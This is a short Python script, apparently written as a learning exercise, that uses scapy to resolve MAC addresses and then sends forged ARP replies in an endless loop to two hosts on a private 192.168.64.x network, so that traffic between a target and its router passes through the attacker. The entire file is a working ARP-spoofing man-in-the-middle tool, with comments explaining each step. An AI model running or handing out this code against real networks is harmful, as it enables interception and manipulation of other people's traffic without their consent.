import scapy.all as scapy
import time
 
def getMac(ip):
    arpPacket = scapy.ARP(pdst=ip)#create an arp packet
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")#where to send the packet
    arp_request_broadcast = broadcast/arpPacket #making the arp packet
    answeredList = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    #sending the packet, 
    #timeout is for waiting and exiting the function or else it will be stuck in a loop
    #verbose is set to false so the output will be a little clean
    return answeredList[0][1].hwsrc
def spoof(target_ip, spoof_ip):
    target_mac = getMac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac)
    #creating an arp packet 
    #psdt=target ip address
    #hwds=target mac address
    #psrc=source ip address meaning where is this packet coming from. WE are gonna set this to router ip.
    scapy.send(packet)

while True:
	spoof("192.168.64.4", "192.168.64.1")
	spoof("192.168.64.1", "192.168.64.4")
	time.sleep(2)



